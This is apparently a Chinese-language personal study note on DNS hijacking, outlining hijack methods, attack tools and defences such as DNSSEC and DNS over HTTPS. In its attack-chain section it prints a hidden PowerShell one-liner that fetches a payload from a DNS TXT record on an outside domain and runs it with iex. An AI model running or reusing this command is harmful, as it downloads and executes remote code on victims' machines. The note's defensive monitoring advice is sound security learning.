# DNS劫持深度指南

## 简介
DNS劫持攻击通过篡改DNS解析结果，将用户重定向到恶意网站。

## 攻击原理

### 1. DNS工作流程
```
用户 -> DNS查询 -> DNS服务器 -> 返回IP
```

### 2. 劫持方式
- 本地DNS劫持
- DNS服务器劫持
- DNS缓存投毒
- 中间人DNS劫持

### 3. KongTuke新型攻击（2025年12月）
- 利用DNS TXT记录存储恶意载荷
- 绕过URL过滤器和防火墙
- 通过公共DNS（8.8.8.8）绕过企业过滤

## 攻击技术

### 1. 本地Hosts文件
```
修改 /etc/hosts (Linux)
修改 C:\Windows\System32\drivers\etc\hosts (Windows)
```

### 2. DNS缓存投毒
```bash
# 发送伪造DNS响应
# 预测Transaction ID
# 注入恶意IP
```

### 3. DNS服务器攻击
- 入侵DNS服务器
- 修改DNS记录

### 4. KongTuke攻击链
```powershell
# PowerShell命令
powershell -w h -ep bypass -c "iex((Resolve-DnsName -Type TXT payload.bruemald.top -Server 8.8.8.8).Strings -join''))"
```

## 攻击工具

### 1. dnsmap
### 2. dnschef
### 3. ettercap
### 4. bettercap

## 防御措施

### 1. 使用HTTPS
- 证书验证
- 防止中间人

### 2. DNS安全
- DNSSEC
- DNS over HTTPS (DoH)
- DNS over TLS (DoT)

### 3. 本地安全
- 定期检查hosts文件
- 使用可信DNS (1.1.1.1, 8.8.8.8)

### 4. 企业防护
- 监控异常的PowerShell执行链
- 监控Resolve-DnsName + iex组合
- 用户安全培训

---
*学习时间: 2026-02-21*
*目标: 成为世界第一黑客*
